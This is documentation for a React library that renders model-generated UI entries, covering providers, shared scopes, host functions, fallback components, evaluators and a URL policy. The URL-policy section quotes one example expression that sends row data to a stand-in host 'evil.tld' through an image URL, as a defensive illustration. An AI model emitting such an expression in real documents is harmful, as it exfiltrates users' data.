# Renderer

Two pieces, both from `@uicast/react`.

`<RendererProvider>` is the **host side**: your
[implementations](/react/impl), your [host functions](/functions), the engine's
fallback UI, and one shared reactive store for everything beneath it.

`<EntriesRenderer>` is the **mount point**: give it [entries](/entry) and it
renders them, evaluating every expression against that store and re-rendering as
state changes.

## Mounting a document

```tsx
import { Evaluator } from "@uicast/expr";
import { EntriesRenderer, RendererProvider } from "@uicast/react";
import { impls } from "@uicast/shadcn-catalog/all-impls";

const evaluator = new Evaluator({ functions: hostFunctions });
const entries = [
  { key: "hello", component: "Typography", props: { literal: { text: "Hello" } } },
];

<RendererProvider implementations={impls} evaluator={evaluator}>
  <EntriesRenderer entries={entries} />
</RendererProvider>;
```

The provider builds the `name → implementation` lookup and creates the group's
**root scope**. The renderer walks the entries in
tree order and mounts each one.

## One store, many renderers

Every `<EntriesRenderer>` under the same provider renders against the **same
`root` scope**:

```tsx
<RendererProvider implementations={impls} evaluator={evaluator}>
  <EntriesRenderer entries={ordersBlock} />
  <EntriesRenderer entries={statsBlock} />
</RendererProvider>;
```

```jsonc
// ordersBlock
{ "key": "new-order", "component": "Button",
  "seed": [{ "set": "scopes.root.orderCount", "literal": 1 }],
  "props": { "literal": { "text": "New order" } },
  "callbacks": { "onClick": [{ "set": "scopes.root.orderCount", "expr": "currentValue + 1" }] } }

// statsBlock
{ "key": "order-count", "component": "Stat",
  "seed": [{ "set": "scopes.root.orderCount", "literal": 0 }],
  "props": { "expr": "({ label: 'Orders', value: scopes.root.orderCount })" } }
```

The Stat shows `1`, not `0`: [`seed`](/entry/fields#seed) is first-writer-wins,
so the second block's seed leaves what the first wrote. Click the button and it
shows `2`.

This is why the fence prompt makes every block seed everything it reads — a
no-op beside a block that already seeded it, and the block still works on its
own. Each ```` ```uicast ```` block is its own `<EntriesRenderer>` (see
[Streamdown plugin](/streamdown)).

To isolate documents instead, give each its own provider.

## `RendererProvider` props

- **`implementations`** — the [`ComponentImplementation`](/react/impl) array,
  partner to the def [registration](/def#registration). A duplicate `name`
  throws. To replace a catalog component, filter its name out of both arrays
  rather than appending over it.
- **`evaluator`** — the expression evaluator, with your host functions bound
  on it: `new Evaluator({ functions })` from `@uicast/expr`. See
  [below](#evaluator--the-expression-evaluator) and [Host functions](/functions).
- **`fallbackComponents`** *(optional)* — the engine's fallback UI; see
  [below](#fallbackcomponents--the-engines-fallback-ui).
- **`init`** *(optional)* — a one-shot side effect for the whole group: preload
  the state documents read, and optionally
  [expose extra named scopes](#extra-named-scopes) beyond `root`. See
  [below](#init--preload-state-for-the-group) and
  [State &amp; Scopes](/entry/state).
- **`onError`** *(optional)* — called once per classified failure: everything the
  `error` slot shows, **plus callback failures**, which render no slot at all. See
  [Error recovery](/error-recovery#classification-entryerror-and-onerror).

`<EntriesRenderer>` takes one prop, **`entries`**, memoized on the array
reference — so a streaming line must arrive as a new array:

```tsx
setEntries((prev) => [...prev, next]); // ✅ new reference — the line mounts
entries.push(next); //                    ❌ same reference — nothing renders
```

Settled subtrees do not re-render as later entries arrive. `<EntriesRenderer>`
throws if rendered outside a `<RendererProvider>`.

### Pass stable references

`implementations` and `functions` feed a context whose identity must stay stable,
or **every element re-renders**. Use module constants:

```tsx
const implementations = [...impls, MyCard]; // ✅ module scope
const functions = [listRows, deleteRow]; //                 ✅ module scope

// ❌ a fresh array each render — every node under it re-renders
<RendererProvider evaluator={evaluator} implementations={[...impls, MyCard]}>…</RendererProvider>;
```

### `functions` — callable from `seed` and `callbacks`

Host functions appear in expressions as **bare identifiers**, called as
`name(input)`, and only in [`seed`](/entry/fields#seed) and
[`callbacks`](/entry/fields#callbacks):

```jsonc
{ "key": "grid", "component": "DataGrid",
  "seed": [{ "set": "scopes.root.rows", "expr": "listRows()" }],
  "props": { "expr": "({ columns: [{ key: 'name', header: 'Name' }], rows: scopes.root.rows })" },
  "callbacks": { "onRowClick": [
    { "expr": "deleteRow({ id: evt.row.id })" },        // no `set` — runs for its effect alone
    { "set": "scopes.root.rows", "expr": "listRows()" }
  ] } }
```

`props` and `hidden` evaluate synchronously, so the same call in `props` hands
the component a Promise instead of rows, and re-fires on every render:

```jsonc
// ❌
{ "key": "grid", "component": "DataGrid",
  "props": { "expr": "({ columns: [{ key: 'name', header: 'Name' }], rows: listRows() })" } }
```

### `fallbackComponents` — the engine's fallback UI

The slots the engine renders itself, as opposed to `implementations`, which the
model names. Three:

| Slot | Rendered when | Default if omitted |
|---|---|---|
| `placeholder` | a child hasn't streamed in yet, an async [`seed`](/entry/fields#seed) is resolving, or an async `init` is still pending (that one covers the whole group) | nothing — the pending element stays empty |
| `confirm` | a callback step carries `confirm:` — the modal that gates it | `window.confirm` |
| `error` | any element-level failure: an implementation throws, an expression fails, an entry is misused as a list, or its `component` has no implementation | bare inline-styled `div` |

Each is optional. The built-in `confirm` and `error` keep the engine renderable
with **zero UI dependencies**; the catalog ships nicer ones you wire in
yourself:

```tsx
import { EntriesRenderer, RendererProvider } from "@uicast/react";
import {
  ConfirmModal,
  RenderError,
} from "@uicast/shadcn-catalog/fallback-components";
import { Skeleton } from "@uicast/shadcn-catalog/ui/skeleton";

<RendererProvider
  evaluator={evaluator}
  implementations={impls}
  fallbackComponents={{
    placeholder: () => <Skeleton className="h-8 w-full" />,
    confirm: ConfirmModal,
    error: RenderError,
  }}
>
  <EntriesRenderer entries={entries} />
</RendererProvider>;
```

Each slot receives props. `placeholder` gets a `reason` — why it is showing, so
you can draw a skeleton while data loads but nothing while a slot streams in.
`confirm` and `error` carry their payloads. All three types are exported from
`@uicast/react`:

```ts
type PlaceholderComponentProps = {
  reason: "streaming" | "seeding";
  //       │             └─ the entry is here, its async `seed` / `init` is resolving
  //       └─ the entry has not streamed in yet
};

type ConfirmComponentProps = {
  open: boolean;      // the dialog is always mounted; this toggles it
  message: string;    // the callback step's `confirm:` text
  onConfirm: () => void;
  onCancel: () => void;
};

type ErrorComponentProps = {
  error: EntryError;      // classified: switch on `error.reason` / `error.fault`
  elementKey?: string;    // set when the failure is tied to a specific entry
};
```

Every failure arrives as an
[`EntryError`](/error-recovery#classification-entryerror-and-onerror), including
an unknown component name, so one component can branch on it:

```tsx
const ErrorSlot = ({ error, elementKey }: ErrorComponentProps) => {
  if (error.reason === "unknown-component")
    return <div>No implementation for “{elementKey}”</div>;
  // a "document" fault is the model's to fix; an "environment" fault is yours
  if (error.fault === "document")
    return <button onClick={() => regenerate(elementKey)}>Regenerate</button>;
  return <div>Something broke here: {error.message}</div>;
};
```

`regenerate` is your app's re-emission trigger — see
[Error recovery](/error-recovery).

`confirm` is a **controlled** dialog: always mounted, shown by `open`, so your
component holds no state of its own. A callback step carrying `confirm:` opens
it:

```jsonc
{ "key": "delete", "component": "Button",
  "props": { "literal": { "text": "Delete", "variant": "destructive" } },
  "callbacks": { "onClick": [
    { "confirm": "Delete this row? This can't be undone.", "expr": "deleteRow({ id: scopes.root.rowId })" },
    { "set": "scopes.root.rows", "expr": "listRows()" }
  ] } }
```

Cancel and neither step runs — a `confirm` step is a barrier.

### `evaluator` — the expression evaluator

Every expression under the provider runs on this instance. Create it once,
outside render — it holds the parse cache — and bind the host functions on it:

```tsx
import { Evaluator } from "@uicast/expr";

const evaluator = new Evaluator({
  functions: hostFunctions,    // see Host functions
  maxSourceLength: 1000,       // the default; tell the prompt the same number
  budget: { steps: 200_000 },  // optional ceilings
});

<RendererProvider implementations={impls} evaluator={evaluator}>
  <EntriesRenderer entries={entries} />
</RendererProvider>;
```

`Evaluator` checks each read and call at run time and needs no CSP
`unsafe-eval` — the choice for any document you did not author yourself.
`PassthroughEvaluator` from `@uicast/expr-passthrough` takes the same options
minus `budget` and runs the source with `new Function`: several times faster,
`unsafe-eval` required, and a [run-time-assembled key](/expr#two-evaluators)
goes unchecked. Only for documents from a trusted author — your own pipeline,
an admin. See [Two evaluators](/expr#two-evaluators).

The prop is typed as `ExpressionEvaluator`, the interface from `@uicast/expr`
that both evaluators implement (`@uicast/core` re-exports it). An evaluator of
your own — a different policy, or a different language with its own prompt —
implements it and plugs in the same way.

### Expression length

One expression may be at most `maxSourceLength` characters — 1000 by default,
rejected before parsing. It is an option of the evaluator, not the provider.
Pass the same value to `getExpressionsPartialPrompt({ maxLength })` so the
model is told the limit it generates under.

### `urlPolicy` — the URLs a document may load

A prop the definition declares as a URL (`z.url()`) is a destination the
browser fetches on render — `<img src>` issues the GET with no interaction. An
expression building
`"https://evil.tld/?d=" + JSON.stringify(scopes.root.rows)` is perfectly legal
JavaScript, so the [evaluator](/expr) rightly allows it; the danger is
the destination, and this policy gates it. The check runs after props parse
and before the implementation sees them.

Without configuration the policy is strict: **relative URLs, same-origin
absolute URLs, raster `data:` images** (never SVG — it can carry script), and
inert schemes (`mailto:`, `tel:`) pass; every other destination is rejected
and the element renders the [error slot](#fallbackcomponents--the-engines-fallback-ui)
instead.

To allow more, pass an object or a predicate:

```tsx
<RendererProvider
  evaluator={evaluator}
  implementations={impls}
  urlPolicy={{ hosts: ["cdn.example.com", "*.imgix.net"] }}
>
  <EntriesRenderer entries={entries} />
</RendererProvider>;
```

| Field | Default | |
| --- | --- | --- |
| `allowRelative` | `true` | `/a`, `a/b`, `?q=1`, `#x`. `//host/a` and `\\host/a` name a host, so they are checked as absolute URLs |
| `allowSameOrigin` | `true` | Absolute URLs on the page origin |
| `hosts` | `[]` | Extra hosts over http/https; `*.example.com` matches subdomains only |
| `allowDataImages` | `true` | `data:` raster images; `image/svg+xml` stays out regardless |
| `origin` | `location.origin` | Set explicitly where there is no `location` (SSR) |

A function form — `urlPolicy={(url) => boolean}` — replaces the rules
entirely. The rejection message names the failing prop and, when a host is the
issue, the exact `hosts` entry that would allow it.

### `init` — preload state for the group

Runs once, when the first `<EntriesRenderer>` mounts, before its entries
evaluate:

```tsx
import type { InitFn } from "@uicast/react";

const init: InitFn = async ({ scopes }) => {
  // assigning a field emits, exactly like `$set`; a nested assignment
  // (`scopes.root.user.name = …`) is a plain write nobody hears
  (scopes.root as Record<string, unknown>).user = await fetchUser();
};

<RendererProvider evaluator={evaluator} implementations={implementations} init={init}>
  <EntriesRenderer entries={entries} />
</RendererProvider>;
```

Every entry under it can read `scopes.root.user.name` on its first render. A
returned Promise suspends the group, which shows the
[`placeholder` slot](#fallbackcomponents--the-engines-fallback-ui) until it
resolves.

### Extra named scopes

`init` can also expose scopes beyond `root`. Build one with
[`createProxyScope`](/api-ref#uicastcore) above the provider — so you keep the
handle — and assign it onto the `scopes` object `init` receives; it is present
before any entry evaluates:

```tsx
import { createProxyScope } from "@uicast/core";

const userCtx = createProxyScope({ name: "Hopper", plan: "pro" });

const init: InitFn = ({ scopes }) => {
  scopes.userCtx = userCtx;
};

<RendererProvider evaluator={evaluator} implementations={implementations} init={init}>
  <EntriesRenderer entries={entries} />
</RendererProvider>;
```

An entry reads it exactly like `root`:

```jsonc
{ "key": "hello", "component": "Typography",
  "props": { "expr": "({ text: 'Hi ' + scopes.userCtx.name })" } }
```

Because you hold `userCtx`, host code can update it whenever —
`userCtx.plan = "free"` — and every document reading it re-renders. That is the
reason to inject a scope rather than just seed `scopes.root` in `init`: a living
handle the host can drive from outside a document.

**Tell the model it exists.** No prompt builder knows about a scope you inject,
so a model never told about it will never emit `scopes.userCtx`. Declare it with
`getCommonInstructionsPartialPrompt`'s `note`, rendered as a `## Note` right
under the prompt's `# Expression Context` section:

```ts
getCommonInstructionsPartialPrompt({
  note: "scopes.userCtx holds the signed-in user: name (string), plan ('free' | 'pro'); read-only.",
});
```

Nothing checks that the note and the object agree. Keep them in step yourself.
